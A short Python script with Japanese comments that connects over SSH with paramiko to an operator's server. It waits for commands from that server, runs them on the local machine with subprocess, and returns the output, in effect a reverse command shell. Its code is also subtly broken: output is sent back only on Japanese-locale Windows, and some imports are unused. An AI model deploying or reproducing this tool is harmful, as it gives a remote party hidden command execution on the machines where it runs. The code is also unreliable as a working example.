from http import client
import locale
import os
from threading import local
import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            # 通信からコマンドを受け取る
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # コマンド実行
                cmd_output = subprocess.check_output(
                    shlex.split(cmd), shell=True
                )
                if os.name == 'nt' and locale.getdefaultlocale() == ('ja_JP', 'cp932'):
                    # 出力があれば呼び出し元に送り返す
                    ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = input('Username: ')
    password = getpass.getpass()

    ip = input('Enter Server IP: ')
    port = input('Enter port: ')
    # 最初に送るコマンドはClientConnected。
    ssh_command(ip, port, user, password, 'ClientConnected')